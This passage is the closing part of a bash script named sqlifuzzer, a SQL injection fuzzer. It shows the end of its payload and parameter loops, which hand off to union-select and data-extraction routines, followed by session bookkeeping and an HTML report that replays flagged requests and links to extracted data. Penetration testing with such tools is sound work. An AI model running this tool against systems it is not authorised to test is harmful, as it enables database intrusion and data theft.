											echo -e '\E[31;48m'"\033[1m[TIME-DELAY-"$time_diff"SEC REQ:$K]\033[0m $method URL: $uhostname$page"??"$output"
											tput sgr0 # Reset attributes.
										fi
									else
										#normal post
										echo "[TIME-DELAY-"$time_diff"SEC REQ:$K] $method URL: $uhostname$page"?"$output" >> ./output/$safefilename$safelogname.txt
										echo -e '\E[31;48m'"\033[1m[TIME-DELAY-"$time_diff"SEC REQ:$K]\033[0m $method URL: $uhostname$page"?"$output"
										tput sgr0 # Reset attributes.
									fi
								fi
							fi
						fi
						#end of time diff scan	
					fi
					#gotta clear down the output buffer:					
					outputstore=$output					
					output=''
				fi						
			done
		#for each payload the vulnerable flag is tested; if true, we call the orderby function to enumerate columns  
		if [[ $vulnerable == 1 ]] ; then
			orderby #calling the orderby function initiates order by, union select and data extraction through string columns tests
			#if [[ $success == 0 ]] ; then
				#if [[ "$dbms" == "" ]] then
					dbtypecheck # calling the dbtypecheck initiates type db checking and conditional (numeric only so far) tests
				#fi
			#fi
		fi 
		vulnerable=0
		success=0
		#echo "DEBUG 001 sessionStorage=$sessionStorage"
		##END OF PER-PAYLOAD LOOP:	
		done
	#echo "DEBUG 002 sessionStorage=$sessionStorage"
	((paramflag=$paramflag+1))
	##END OF PER-PARAMETER LOOP:
	vulnerable=0
	done
##END OF PER-URL LOOP:
#code that stores the current URL and params for comparison against the next URL - this can be used to skip params already scanned

#this code stores the uri (which is now old) in a text file:
#this allows the old URI value to persist so that it can be compared with the new URI
#this is used to check if we are scanning the same page, or a new page.
oldURL=`echo $i | cut -d "?" -f 1`
echo $oldURL > ./session/$safehostname.$safelogname.oldURL.txt

#this code stores the stringofparams value (which is now old) in a text file
# infact, a list is created with a parameter name on each new line:
for dfg in $stringofparams; do
	echo `echo $dfg | cut -d "=" -f1` >> ./session/$safehostname.$safelogname.oldparamlist.txt
done

#the list created in the above code grows with each URL as long as the pages match
#as a result, it has to be sort|uniq-ed to remove duplicate entries
cp ./session/$safehostname.$safelogname.oldparamlist.txt ./temp.txt
cat ./temp.txt | grep . | sort | uniq > ./session/$safehostname.$safelogname.oldparamlist.txt
rm ./temp.txt
#cat ./session/$safehostname.$safelogname.oldparamlist.txt

#this code resets the firstposturl flag which is used to handle POSTs with URLs
if [ $firstPOSTURIURL == 2 ] ; then
	firstPOSTURIURL=0
fi

#write the URL number into the session file:
echo $((K+1)) > ./session/$safehostname.$safelogname.session.txt
done
fi

# that 'fi' above is the end of the scan loop
#if you get here, youve finished scanning so write nothing into the session file to clear it down:
echo "" > ./session/$safehostname.session.txt

#need to do this at the end to clean up:
#need to update this

rm ./parameters_to_skip.txt 2>/dev/null
rm scannerinputlist.txt 2>/dev/null
rm cleanscannerinputlist.txt 2>/dev/null
rm 0 2>/dev/null
rm dump 2>/dev/null
rm dumpfile 2>/dev/null
rm 1scannerinputlist.txt 2>/dev/null
rm search.txt 2>/dev/null
rm dumpfile 2>/dev/null
rm dump 2>/dev/null
rm payloads.txt 2>/dev/null

# this sorts the results alphabetically - want to improve on this; make the good stuff float to the top of the page
cat ./output/$safefilename$safelogname.txt 2>/dev/null | sort | uniq > ./output/$safefilename$safelogname.sorted.txt  
cat ./output/$safefilename$safelogname.status.txt 2>/dev/null | sort | uniq >> ./output/$safefilename$safelogname.sorted.txt

# code that parses the output .txt file and creates a nice html report:
echo "<html>" >> ./output/$safefilename$safelogname.html
echo "<head>" >> ./output/$safefilename$safelogname.html
echo "<title>sqlifuzzer results page</title>" >> ./output/$safefilename$safelogname.html
echo "<body bgcolor="Silver">" >> ./output/$safefilename$safelogname.html
echo "<H3>sqlifuzzer test results</H3>" >> ./output/$safefilename$safelogname.html
echo "Output file: ./output/$safefilename$safelogname.txt" >> ./output/$safefilename$safelogname.html
echo "<br>" >> ./output/$safefilename$safelogname.html
echo "Host scanned: $uhostname" >> ./output/$safefilename$safelogname.html
echo "<br>" >> ./output/$safefilename$safelogname.html
echo "Time of scan: $(date)" >> ./output/$safefilename$safelogname.html
echo "<br>" >> ./output/$safefilename$safelogname.html
echo "------------------------------------------------------------------" >> ./output/$safefilename$safelogname.html
echo "<br>" >> ./output/$safefilename$safelogname.html

echo "Reading in ./output/$safefilename$safelogname.sorted.txt"
echo "Compiling report to create ./output/$safefilename$safelogname.html"

cat ./output/$safefilename$safelogname.sorted.txt | while read aLINE ; do
	echo -n "."
	message=`echo $aLINE|cut -d "]" -f1|cut -d "[" -f2`
	#echo $message
	fullrequest=`echo $aLINE|cut -d "]" -f2`
	method=`echo $fullrequest | cut -d " " -f1`
	request=`echo $fullrequest | cut -d " " -f3`

	protocol=`echo $request | cut -d "/" -f1`
	host=`echo $request | cut -d "/" -f3`
	params=`echo $request | cut -d "/" -f4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30`
	page=`echo $params | cut -d "?" -f1`

	#echo "fullrequest: $fullrequest"
	#echo "message $message";
	#echo "method $method";
	#echo "request $request";
	#echo "protocol $protocol"
	#echo "host $host"
	#echo "params: $params"

	if [[ "$method" == "POST" ]] ; then
		if [[ $request =~ "??" ]] ; then 
			postdataparams=`echo $params | cut -d "?" -f4`
			postURIparams=`echo $params | cut -d "?" -f2`
			#echo "postURIparams $postURIparams"
			#echo "postdataparams $postdataparams"

		else
			postdataparams=`echo $params | cut -d "?" -f2`			
			#echo "postdataparams $postdataparams"
		fi
		postdataparamslist=`echo "$postdataparams"| replace "&" " "`
	fi

	echo "$message" >> ./output/$safefilename$safelogname.html
	echo "<br>" >> ./output/$safefilename$safelogname.html
	echo "<br>" >> ./output/$safefilename$safelogname.html
	if [[ "$method" == "GET" ]]  ; then 
		echo "$method /$params" >> ./output/$safefilename$safelogname.html
		echo "<br>" >> ./output/$safefilename$safelogname.html	
		echo "Host: $host" >> ./output/$safefilename$safelogname.html
		echo "<br>" >> ./output/$safefilename$safelogname.html
		echo "<br>" >> ./output/$safefilename$safelogname.html
		echo "<a href="$request">Submit Query</a>" >> ./output/$safefilename$safelogname.html
		echo "<br>" >> ./output/$safefilename$safelogname.html
	else
		if [[ $request =~ "??" ]] ; then 
			echo "$method /$page?$postURIparams" >> ./output/$safefilename$safelogname.html
			echo "<br>" >> ./output/$safefilename$safelogname.html
			echo "Host: $host" >> ./output/$safefilename$safelogname.html
			echo "<br>" >> ./output/$safefilename$safelogname.html
			echo "<br>" >> ./output/$safefilename$safelogname.html

			decodeinput=$postdataparams
			encodeme
			decparam=$decodeoutput

			#decparam=`echo $postdataparams | replace "%20" " " | replace "%2e" "." | replace "%3c" "<" | replace "%3e" ">" | replace "%3f" "?" | replace "%2b" "+" | replace "%2a" "*" | replace "%3b" ";" | replace "%3a" ":" | replace "%28" "(" | replace "%29" ")" | replace "%2c" ","`;
			echo "$decparam" >> ./output/$safefilename$safelogname.html
			echo "<br>" >> ./output/$safefilename$safelogname.html			
			echo "<br>" >> ./output/$safefilename$safelogname.html
			echo "<form action="$protocol//$host/$page?$postURIparams" method="POST">" >> ./output/$safefilename$safelogname.html
			for param in `echo $postdataparamslist` ; do
				paramname=`echo $param | cut -d "=" -f 1`
				paramval=`echo $param | cut -d "=" -f 2`
				#this is the in the inverse of the encoding line in the fuzz loop
				decodeinput=$paramval
				encodeme
				decparam=$decodeoutput
				#decparam=`echo $paramval | replace "%20" " " | replace "%2e" "." | replace "%3c" "<" | replace "%3e" ">" | replace "%3f" "?" | replace "%2b" "+" | replace "%2a" "*" | replace "%3b" ";" | replace "%3a" ":" | replace "%28" "(" | replace "%29" ")" | replace "%2c" ","`;
				echo -n "<Input type="hidden" name=\""$paramname"\" value=\""$decparam"\"> " >> ./output/$safefilename$safelogname.html
				#echo "<br>" >> ./output/$safefilename$safelogname.html
			done
			echo "<input type="submit"> " >> ./output/$safefilename$safelogname.html
			echo "</form> " >> ./output/$safefilename$safelogname.html

		else
			echo "$method /$page" >> ./output/$safefilename$safelogname.html
			echo "<br>" >> ./output/$safefilename$safelogname.html
			echo "Host: $host" >> ./output/$safefilename$safelogname.html
			echo "<br>" >> ./output/$safefilename$safelogname.html
			echo "<br>" >> ./output/$safefilename$safelogname.html
			decodeinput=$paramval
			encodeme
			decparam=$decodeoutput
			#decparam=`echo $postdataparams | replace "%20" " " | replace "%2e" "." | replace "%3c" "<" | replace "%3e" ">" | replace "%3f" "?" | replace "%2b" "+" | replace "%2a" "*" | replace "%3b" ";" | replace "%3a" ":" | replace "%28" "("| replace "%29" ")" | replace "%2c" ","`;
			echo "$decparam" >> ./output/$safefilename$safelogname.html
			echo "<br>" >> ./output/$safefilename$safelogname.html
			echo "<br>" >> ./output/$safefilename$safelogname.html
			#echo "$postdataparams"
			#echo "$postdataparamslist"
			echo "<form action="$protocol//$host/$page" method="POST">" >> ./output/$safefilename$safelogname.html
			for param in `echo $postdataparamslist` ; do
				paramname=`echo $param | cut -d "=" -f 1`
				paramval=`echo $param | cut -d "=" -f 2`
				decodeinput=$paramval
				encodeme
				decparam=$decodeoutput
				#decparam=`echo $paramval | replace "%20" " " | replace "%2e" "." | replace "%3c" "<" | replace "%3e" ">" | replace "%3f" "?" | replace "%2b" "+" | replace "%2a" "*" | replace "%3b" ";" | replace "%3a" ":" | replace "%28" "("| replace "%29" ")" | replace "%2c" ","`;
				echo -n "<Input type="hidden" name=\""$paramname"\" value=\""$decparam"\"> " >> ./output/$safefilename$safelogname.html
				#echo "<br>" >> ./output/$safefilename$safelogname.html
			done
			echo "<input type="submit"> " >> ./output/$safefilename$safelogname.html
			echo "</form> " >> ./output/$safefilename$safelogname.html
		fi
	fi
	if [[ "$message" =~ "DATA-EXTRACTED" ]] ; then
		echo "<br>" >> ./output/$safefilename$safelogname.html
		respdiff=`echo $message | grep -o $safehostname.*` 
		#echo "debug message=$message"
		#echo "debug respdiff=$respdiff"
		echo " <a href="./../responsediffs/$respdiff">View Extracted Data</a>" >> ./output/$safefilename$safelogname.html
		echo "<br>" >> ./output/$safefilename$safelogname.html	
	fi
	if [[ "$message" =~ "LENGTH-DIFF" ]] ; then
		echo "<br>" >> ./output/$safefilename$safelogname.html
		respdiff=`echo $message | cut -d " " -f 4`
		echo " <a href="./../responsediffs/$respdiff">View Response Diff</a>" >> ./output/$safefilename$safelogname.html
		echo "<br>" >> ./output/$safefilename$safelogname.html	
	fi
	echo "------------------------------------------------------------------" >> ./output/$safefilename$safelogname.html
	echo "<br>" >> ./output/$safefilename$safelogname.html
done
echo "<H3>sqlifuzzer site analysis</H3>" >> ./output/$safefilename$safelogname.html
cat ./session/$safehostname.$safelogname.siteanalysis.txt | while read bLINE ; do
	echo -n "."
	echo "$bLINE" >> ./output/$safefilename$safelogname.html
	echo "<br>" >> ./output/$safefilename$safelogname.html
done
echo "" > ./session/$safehostname.$safelogname.siteanalysis.txt	
echo "</body>" >> ./output/$safefilename$safelogname.html
echo "</html>" >> ./output/$safefilename$safelogname.html 
echo ""
echo "Done. HTML report written to ./output/$safefilename$safelogname.html"
echo "Attempting to open ./output/$safefilename$safelogname.html with firefox"
firefox ./output/$safefilename$safelogname.html 2>/dev/null &
